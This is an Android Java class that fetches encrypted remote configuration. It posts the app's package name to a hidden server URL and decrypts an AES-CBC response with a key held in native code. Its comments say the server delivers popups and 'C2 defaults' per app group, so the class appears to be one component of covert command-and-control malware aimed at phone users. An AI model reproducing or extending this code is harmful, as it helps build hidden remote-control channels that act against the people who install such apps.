package com.example.msphone;

import android.content.Context;
import android.util.Base64;

import com.google.gson.Gson;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * 拉取并解密远程配置。
 *
 * 协议（card_server "/"）：GET/POST 返回 base64( IV(16) || AES-128-CBC(key, IV, json) )，
 * key 来自原生层 {@link Vault#aesKey()}，明文是配置 JSON。
 *
 * 注意：内部用 httphelp 的 CompletableFuture 做同步等待，调用方必须在子线程执行。
 */
final class ConfigClient {

    private static final Gson GSON = new Gson();

    private ConfigClient() {}

    /** 拉取并解析远程配置；失败返回 null。 */
    static RemoteConfig fetch() {
        return fetch(null);
    }

    /** 拉取并解析远程配置；带上软件标识，让服务端按分组下发弹窗与 C2 默认值。 */
    static RemoteConfig fetch(Context ctx) {
        try {
            String url = Vault.urlConfig();
            Map<String, String> fields = new HashMap<>();
            if (ctx != null) fields.put("software_type", ctx.getPackageName());
            String body = httphelp.postForm(url, fields).get(12, TimeUnit.SECONDS);
            if (body == null) return null;
            String json = decrypt(body.trim());
            if (json == null || json.isEmpty()) return null;
            return GSON.fromJson(json, RemoteConfig.class);
        } catch (Throwable t) {
            return null;
        }
    }

    static String decrypt(String base64Payload) {
        try {
            byte[] all = Base64.decode(base64Payload, Base64.DEFAULT);
            if (all.length <= 16) return null;
            byte[] iv = Arrays.copyOfRange(all, 0, 16);
            byte[] ct = Arrays.copyOfRange(all, 16, all.length);
            byte[] key = Vault.aesKey().getBytes(StandardCharsets.UTF_8);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
            return new String(cipher.doFinal(ct), StandardCharsets.UTF_8);
        } catch (Throwable t) {
            return null;
        }
    }
}
